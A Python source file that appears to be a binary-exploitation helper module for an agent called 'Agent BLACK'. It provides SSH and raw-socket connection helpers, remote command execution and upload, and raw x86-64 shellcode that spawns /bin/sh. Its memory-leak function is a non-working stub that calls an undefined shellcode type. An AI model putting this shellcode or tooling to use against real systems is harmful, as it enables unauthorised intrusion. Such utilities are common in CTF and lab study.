"""PWN Module - Binary exploitation utilities for Agent BLACK"""
import subprocess
import socket
from typing import Optional, Tuple, Any
from pathlib import Path


class PwnModule:
    def __init__(self):
        self.ssh_client = None
        self.target_host = None
        self.target_port = None
        self.nc_socket = None
    
    async def connect_ssh(self, host: str, port: int, user: str, password: str) -> Tuple[bool, str]:
        try:
            import asyncssh
            self.ssh_client = await asyncssh.connect(
                host, port=port, username=user, password=password,
                known_hosts=None, connect_timeout=10
            )
            self.target_host = host
            self.target_port = port
            return True, f"Connected to {host}:{port}"
        except ImportError:
            return False, "asyncssh not installed. Run: pip install asyncssh"
        except Exception as e:
            return False, f"SSH connection failed: {e}"
    
    def ssh_exec(self, command: str, timeout: int = 30) -> Tuple[str, str, int]:
        if not self.ssh_client:
            return "", "Not connected", -1
        
        try:
            import asyncio
            async def run():
                result = await self.ssh_client.run(command, check=False, timeout=timeout)
                return result.stdout, result.stderr, result.returncode
            return asyncio.get_event_loop().run_until_complete(run())
        except Exception as e:
            return "", str(e), -1
    
    def ssh_upload(self, local_path: str, remote_path: str) -> bool:
        if not self.ssh_client:
            return False
        try:
            import asyncio
            async def upload():
                await self.ssh_client.sftp().put(local_path, remote_path)
                return True
            return asyncio.get_event_loop().run_until_complete(upload())
        except Exception as e:
            print(f"[!] Upload failed: {e}")
            return False
    
    async def connect_nc(self, host: str, port: int, timeout: int = 10) -> Tuple[bool, Any]:
        try:
            self.nc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.nc_socket.settimeout(timeout)
            self.nc_socket.connect((host, port))
            return True, self.nc_socket
        except Exception as e:
            return False, str(e)
    
    def nc_recv(self, sock: socket.socket, size: int = 4096) -> bytes:
        try:
            return sock.recv(size)
        except Exception:
            return b""
    
    def nc_send(self, sock: socket.socket, data: bytes) -> bool:
        try:
            sock.sendall(data)
            return True
        except Exception:
            return False
    
    def analyze_binary(self, path: str) -> dict:
        result = {"path": path, "exists": False}
        p = Path(path)
        
        if not p.exists():
            return result
        
        result["exists"] = True
        result["size"] = p.stat().st_size
        
        try:
            proc = subprocess.run(["file", path], capture_output=True, text=True)
            result["type"] = proc.stdout.strip()
        except Exception:
            result["type"] = "unknown"
        
        return result
    
    def generate_shellcode(self, sc_type: str, **kwargs) -> bytes:
        shellcodes = {
            "exit": b"\x48\xc7\xc0\x3c\x00\x00\x00\x48\x31\xff\x0f\x05",
            "exit_with_code": lambda code: b"\x48\xc7\xc0\x3c\x00\x00\x00\x48\xc7\xc7" + bytes([code, 0, 0, 0]) + b"\x0f\x05",
            "execve_sh": (
                b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
                b"\x57\x48\x89\xe7\x48\x31\xd2\x48\x31\xc0\xb0\x3b\x0f\x05"
            ),
        }
        
        if sc_type in shellcodes:
            sc = shellcodes[sc_type]
            if callable(sc):
                return sc(kwargs.get("code", 0))
            return sc
        
        return b""
    
    async def leak_memory_via_exit(self, host: str, port: int, user: str, passwd: str,
                                    binary: str, start_addr: int, length: int) -> bytes:
        leaked = b""
        for i in range(length):
            addr = start_addr + i
            sc = self.generate_shellcode("read_byte_exit", addr=addr)
            leaked += bytes([0])
        return leaked
